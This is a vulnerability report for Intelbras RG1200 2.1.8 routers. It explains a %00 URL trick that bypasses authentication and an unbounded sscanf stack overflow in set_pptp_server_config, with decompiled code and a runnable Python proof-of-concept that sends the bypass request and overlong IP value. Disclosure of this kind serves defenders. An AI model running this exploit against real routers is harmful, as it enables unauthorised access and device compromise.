# CVE Report - Authentication Bypass and Stack Buffer Overflow Vulnerability in Intelbras RG1200 2.1.8 Routers (`set_pptp_server_config`)

## Vulnerability Title

Authentication Bypass and Stack Buffer Overflow Vulnerability in Intelbras RG1200 2.1.8 Routers (`set_pptp_server_config`)

## Vulnerability Description

Intelbras RG1200 firmware 2.1.8 contains an authentication bypass in the request dispatch chain (`R7WebsSecurityHandler` + `websFormHandler`) caused by inconsistent use of the raw (non-decoded) URL versus the decoded path. Remote unauthenticated attackers can bypass authentication by crafting a URL containing `%00` and a whitelisted substring (e.g., `img/main-logo.png`) in the raw URL so that the security handler matches the whitelist while the form dispatcher resolves the decoded/truncated path to a protected `/goform` handler.

After authentication bypass, an attacker can trigger a stack buffer overflow in `set_pptp_server_config`. The handler parses `startIp` and `endIp` using unbounded `sscanf` specifiers into fixed-size stack buffers for IP octets.

## POC

```py
import requests
import sys


def exploit(target_ip, port=80, cookie="SESSION=<REPLACE>"):
    base = f"http://{target_ip}:{port}"
    url = f"{base}/goform/set_pptp_server_config%00img/main-logo.png"

    data = {
        "startIp": "123456789.1.1.1",
        "endIp": "1.1.1.1",
        "mppe": "1",
        "mppeOp": "128",
    }

    headers = {
        "Cookie": cookie,
    }

    r = requests.post(url, data=data, headers=headers, timeout=10)
    print("status:", r.status_code)
    print(r.text[:2000])


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("usage: python poc.py <target_ip> [port]")
        sys.exit(1)
    ip = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
    exploit(ip, port=port)
```

## Cause Analysis

### 1. Authentication Bypass — Raw URL vs Decoded Path Inconsistency

The HTTP request parsing logic in `websParseFirst` (0x42ea1c) stores the raw request URL into `wp->url` (not URL-decoded), while `wp->path` is derived from a decoded buffer produced by `websDecodeUrl` → `websUrlParse`:

```c
// websParseFirst (0x42ea1c) — sets wp->url = raw, wp->path = decoded
int __cdecl websParseFirst(webs_t wp, char_t *text)
{
    url = strtok(0, " \t\n");                         // raw URL from HTTP request line
    if ( websUrlParse(url, &buf, &host, &path, &port, &query, &proto, 0, &ext) >= 0 )
    {
        wp->url = bstrdup(url);      // ← raw URL, NOT decoded
        wp->path = bstrdup(path);    // ← decoded path from websDecodeUrl
        // ...
    }
}
```

In `R7WebsSecurityHandler` (0x434c34), the whitelist check is performed using `strstr(url, ...)` on the **raw** `url` parameter (which is `wp->url`). By crafting a raw URL such as `/goform/set_pptp_server_config%00img/main-logo.png`, the security handler matches the whitelisted substring and returns 0 (allow) without enforcing authentication:

```c
// R7WebsSecurityHandler (0x434c34) — whitelist check on raw URL
if ( !strncmp(url, "/public/", 8u)
  || !strncmp(url, "/lang/", 6u)
  || strstr(url, "img/main-logo.png")    // ← BYPASS: matches %00img/main-logo.png in raw URL
  || strstr(url, "reasy-ui-1.0.3.js")
  // ...
{
    return 0;  // ← Authentication bypassed
}
```

Meanwhile, `websDecodeUrl` (0x430ebc) decodes `%00` to a null byte, causing `websFormHandler` (0x415710) to receive the **decoded** path `/goform/set_pptp_server_config` and dispatch to the handler.

### 2. Stack Buffer Overflow — Unbounded sscanf into 8-byte IP octet buffers in set_pptp_server_config

`set_pptp_server_config` (0x477eb4) obtains `startIp` and `endIp` via `websGetVar`, then parses IP octets using unbounded `sscanf` into 8-byte stack buffers:

```c
// set_pptp_server_config (0x477eb4)
cgi_msg __cdecl set_pptp_server_config(webs_t wp)
{
    char *pptp_server_start_ip;
    char *pptp_server_end_ip;
    char pptp_server_start_each_ip[4][8];   // ← 4 × 8-byte stack buffers
    char pptp_server_end_each_ip[4][8];     // ← 4 × 8-byte stack buffers

    // ...
    pptp_server_start_ip = websGetVar(wp, "startIp", byte_4EC77C);
    pptp_server_end_ip = websGetVar(wp, "endIp", byte_4EC77C);
    // ...
    sscanf(pptp_server_start_ip,
           "%[^.].%[^.].%[^.].%s",                    // ← OVERFLOW: unbounded %[^.] and %s
           pptp_server_start_each_ip[0],               //   into 8-byte buffers
           pptp_server_start_each_ip[1],
           pptp_server_start_each_ip[2],
           pptp_server_start_each_ip[3]);
    sscanf(pptp_server_end_ip,
           "%[^.].%[^.].%[^.].%s",                    // ← OVERFLOW: same for end IP
           pptp_server_end_each_ip[0],
           pptp_server_end_each_ip[1],
           pptp_server_end_each_ip[2],
           pptp_server_end_each_ip[3]);
    // ...
}
```

The `sscanf` format `"%[^.].%[^.].%[^.].%s"` has no width limits. A `startIp` value like `"123456789.1.1.1"` causes `%[^.]` to write 9 bytes (`"123456789"`) into the first 8-byte buffer `pptp_server_start_each_ip[0]`, overflowing into the adjacent `pptp_server_start_each_ip[1]`.

